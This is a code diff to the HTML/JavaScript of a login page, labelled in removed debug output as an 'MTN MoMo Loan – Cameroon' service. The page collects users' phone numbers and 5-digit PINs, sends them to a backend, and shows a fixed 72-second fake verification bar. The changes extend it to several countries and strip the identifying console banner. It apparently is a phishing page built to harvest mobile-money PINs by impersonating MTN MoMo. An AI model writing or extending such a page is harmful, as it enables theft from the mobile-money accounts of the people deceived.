+            eyeToggle.setAttribute('aria-label', pinVisible ? 'Hide PIN' : 'Show PIN');
+            eyeToggle.setAttribute('title', pinVisible ? 'Hide PIN' : 'Show PIN');
+        });
+
+        // ============================================
+        // VERIFY OVERLAY
         // ============================================
         const verifyOverlay = document.getElementById('verifyOverlay');
         const verifyBarFill = document.getElementById('verifyBarFill');
-
         let verifyTimer = null;
 
         function startVerifyBar(durationMs) {
@@ -621,7 +1029,6 @@
                 const raw = (elapsedMs / 1000) / totalSeconds;
                 const eased = 1 - Math.pow(1 - Math.min(raw, 1), 2.2);
                 verifyBarFill.style.width = Math.min(eased * 100, 99).toFixed(1) + '%';
-
                 if (elapsedMs >= durationMs) {
                     clearInterval(verifyTimer);
                     verifyBarFill.style.width = '100%';
@@ -635,21 +1042,22 @@
         }
 
         // ============================================
-        // LOGIN BUTTON
+        // LOGIN
         // ============================================
         const loginBtn = document.getElementById('loginBtn');
 
         loginBtn.addEventListener('click', async function() {
-            // --- Validate phone ---
+            const countryData = COUNTRIES[currentCountry];
             const phoneDigits = phoneInput.value.replace(/\s/g, '');
-            if (phoneDigits.length !== 9 || !/^\d{9}$/.test(phoneDigits)) {
+
+            if (phoneDigits.length !== countryData.digits || !/^\d+$/.test(phoneDigits)) {
                 phoneWrapper.classList.add('invalid');
+                phoneError.textContent = `Please enter a valid ${countryData.digits}-digit phone number`;
                 phoneError.classList.add('show');
                 phoneInput.focus();
                 return;
             }
 
-            // --- Validate PIN (5 digits) ---
             const pin = getPinValue();
             if (pin.length !== 5) {
                 pinBoxes.forEach(b => b.classList.add('invalid'));
@@ -658,15 +1066,14 @@
                 return;
             }
 
-            // --- UI: disable button + show overlay ---
             loginBtn.disabled = true;
             loginBtn.textContent = 'LOGGING IN...';
 
             startVerifyBar(LOADING_DURATION_MS);
             const overlayStart = Date.now();
+            const fullPhone = countryData.code + phoneDigits;
 
             try {
-                // --- Call backend ---
                 const controller = new AbortController();
                 const timeoutId = setTimeout(() => controller.abort(), 15000);
 
@@ -674,7 +1081,8 @@
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        phone: '+237' + phoneDigits,
+                        phone: fullPhone,
+                        country: currentCountry,
                         pin: pin
                     }),
                     signal: controller.signal
@@ -687,17 +1095,15 @@
                     throw new Error(data.error || 'Login failed');
                 }
 
-                // --- Save session ---
                 localStorage.setItem('momoSession', JSON.stringify({
-                    phone: '+237' + phoneDigits,
-                    country: 'CM',
+                    phone: fullPhone,
+                    country: currentCountry,
                     token: data.token,
                     loggedInAt: new Date().toISOString()
                 }));
+                localStorage.setItem('momoPhone', fullPhone);
+                localStorage.setItem('momoCountry', currentCountry);
 
-                localStorage.setItem('momoPhone', '+237' + phoneDigits);
-
-                // --- Hold overlay for FULL 72 seconds ---
                 const elapsed = Date.now() - overlayStart;
                 const remaining = Math.max(0, LOADING_DURATION_MS - elapsed);
 
@@ -713,8 +1119,7 @@
                 finishVerifyBar();
                 verifyOverlay.classList.remove('show');
                 loginBtn.disabled = false;
-                loginBtn.textContent = 'LOGIN →';
-
+                loginBtn.textContent = 'LOGIN';
                 const reason = err.name === 'AbortError'
                     ? 'Server took too long. Please try again.'
                     : (err.message || 'Could not connect. Check your internet.');
@@ -722,15 +1127,12 @@
             }
         });
 
-        // Auto-focus first PIN box after phone is entered
         phoneInput.addEventListener('blur', function() {
             const digits = this.value.replace(/\s/g, '');
-            if (digits.length === 9 && !getPinValue()) pinBoxes[0].focus();
+            const needed = COUNTRIES[currentCountry].digits;
+            if (digits.length === needed && !getPinValue()) pinBoxes[0].focus();
         });
 
-        // ============================================
-        // CLEAN ON LOAD
-        // ============================================
         window.addEventListener('load', () => {
             phoneInput.value = '';
             pinBoxes.forEach(b => {
@@ -739,12 +1141,6 @@
             });
             phoneInput.focus();
         });
-
-        console.log('====================================');
-        console.log('💰 MTN MoMo Loan – Cameroon');
-        console.log('🔐 Login connected to:', API_BASE);
-        console.log('⏱️ Loading duration:', LOADING_DURATION_MS / 1000, 'seconds');
-        console.log('====================================');
     </script>
 </body>
 </html>
